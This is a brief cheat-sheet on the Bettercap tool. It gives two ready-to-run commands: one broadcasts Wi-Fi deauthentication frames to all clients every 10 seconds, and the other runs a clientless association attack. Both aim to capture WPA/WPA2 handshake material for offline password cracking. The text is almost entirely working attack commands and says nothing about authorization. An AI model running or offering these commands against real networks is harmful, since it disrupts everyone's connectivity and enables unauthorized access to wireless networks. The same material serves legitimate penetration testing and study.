# Bettercap 

Network reconnaisance tooling, particularly useful for grabbing hasesh to crack

# Capturing WPA/WPA2 Crackable Key MAterials

Run the following to do a mass deauth every 10 seconds on iface wlan0, hopefully capturing some stuff to crack, along with spinning up the http-ui caplet

```shell
$> sudo bettercap -caplet http-ui -iface wlan0 -eval "set ticker.period 10; set ticker.commands wifi.deauth ff:ff:ff:ff:ff:ff; wifi.recon on; ticker on;"
```

Alternatively you can try a client-liss association attack

```shell
$> sudo bettercap -caplet http-ui -iface wlan0 -eval "set ticker.period 5; set ticker.commands wifi.assoc all; wifi.recon on; ticker on;"
```